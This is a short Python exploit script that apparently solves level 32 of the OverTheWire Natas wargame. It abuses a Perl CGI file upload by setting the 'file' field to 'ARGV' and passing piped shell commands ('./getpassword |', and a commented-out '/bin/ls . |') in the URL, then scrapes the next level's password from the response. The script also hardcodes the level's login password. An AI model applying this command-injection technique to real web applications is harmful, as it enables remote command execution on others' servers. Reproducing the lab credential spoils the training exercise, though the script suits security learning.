import requests
import re

URL = "http://natas32.natas.labs.overthewire.org/index.pl?{}"
USERNAME = "natas32"
PASSWORD = "no1vohsheCaiv3ieH4em1ahchisainge"

files = {'file': ("file.csv", "1, 2, 3", "text/csv")}
data = {'file': 'ARGV'}

#x = requests.post(URL.format("/bin/ls%20.%20|"), auth=(USERNAME, PASSWORD), files=files, data=data)
x = requests.post(URL.format("./getpassword%20|"), auth=(USERNAME, PASSWORD), files=files, data=data)
flag = re.findall(r'<tr><th>(.*)', x.text)[0]
print(flag)
